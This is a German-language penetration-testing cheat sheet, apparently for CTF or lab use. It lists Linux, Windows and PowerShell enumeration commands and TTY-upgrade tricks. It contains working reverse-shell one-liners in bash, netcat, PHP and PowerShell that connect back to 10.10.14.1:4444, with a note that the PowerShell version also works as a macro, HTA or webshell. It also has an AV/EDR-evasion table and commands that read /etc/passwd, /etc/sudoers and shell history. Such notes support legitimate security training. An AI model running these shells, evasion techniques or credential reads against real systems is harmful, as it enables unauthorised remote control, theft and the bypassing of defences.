____________________________________________________________________________
| Begriff   | Bedeutung                                                    |
| --------- | ------------------------------------------------------------ |
| CLI       | *Command Line Interface*, z. B. Bash, CMD, PowerShell        |
| Shell     | Benutzerinterface zur Systemsteuerung (via Textbefehle)      |
| TTY / PTY | *Teletype* / *Pseudo Terminal* – wichtig bei Shell-Spawns    |
| REPL      | Read-Eval-Print-Loop – Grundprinzip jeder interaktiven Shell |


**🐧 Linux Shell Basics (bash, sh, zsh):**
pwd                     # aktuelles Verzeichnis
ls -lah                  # alle Dateien anzeigen
cd /etc                 # in Verzeichnis wechseln
whoami                  # aktueller Nutzer
id                      # Nutzer + Gruppen
uname -a                # Kernelversion
hostname                # Hostname
sudo -l                 # Sudo-Rechte anzeigen
find / -perm -u=s -type f 2>/dev/null  #SUID
**Prozesse & Netzwerk**
ps aux | grep root
netstat -tulnp
ss -tuln
**Pakete & Dienste**
dpkg -l                 # Debian Pakete
rpm -qa                 # RedHat Pakete
systemctl list-units --type=service


**Bash & Reverse Shells:** (lokal listener: nc -lvnp 4444)
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
nc -e /bin/sh 10.10.14.1 4444
php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

**Shell POWER-UP**
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL-Z → stty raw -echo; fg


**Windows:**
whoami
hostname
ipconfig /all
tasklist
netstat -ano
dir
cd
type file.txt

**Dienste & Prozesse**
sc query
tasklist /SVC
wmic service list brief

**Benutzer und Gruppen**
net user
net localgroup
net localgroup administrators



**PowerShell:**
Get-Process
Get-Service
Get-LocalUser
Get-LocalGroup
Get-Content C:\flag.txt
Start-Process cmd.exe

Get-NetTCPConnection
Test-Connection 10.10.14.1
Resolve-DnsName target.local

Get-ChildItem -Recurse -Force
Get-Acl C:\flag.txt | Format-List

**PowerShell Reverse Shell:**
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object Net.Sockets.TCPClient("10.10.14.1",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback + "PS " + (pwd).Path + "> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
# → Funktioniert auch in HTA-, Macro- oder Webshell-Form.

| Typ                    | Beschreibung                   | TTY-Upgrade nötig?     |
| ---------------------- | ------------------------------ | ---------------------- |
| **Bash Shell**         | Direkt via Linux               | Meist ja               |
| **Meterpreter**        | MSF Shell mit Zusatzfunktionen | Nein                   |
| **PowerShell**         | Windows, mächtig & oft erlaubt | Nein                   |
| **CMD Shell**          | Basic, aber oft Whitelisted    | Nein                   |
| **Webshells**          | z. B. PHP, JSP, ASPX           | Ja, für Interaktivität |
| **nc/powershell/bind** | Manuelle Verbindung            | Ja, meistens           |

**AV/EDR-Evasion:**
| Technik                    | Erklärung                             |
| -------------------------- | ------------------------------------- |
| Encoding                   | z. B. base64-encoded PowerShell       |
| Obfuscation                | Variablennamen, String-Mix            |
| LOLBins                    | legitime Binaries (z. B. `mshta.exe`) |
| ScriptBlockLogging umgehen | `-ExecutionPolicy Bypass`             |
| ASLR umgehen               | Shellcode-Stager + Loader             |


env
printenv
cat /etc/passwd
cat /etc/group
cat /etc/sudoers
cat ~/.bash_history

Get-History
Get-ExecutionPolicy
Get-Command -Module Net*

# Shell-Erweiterung (TTY-Fix, Interaktivität)
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo; fg
reset
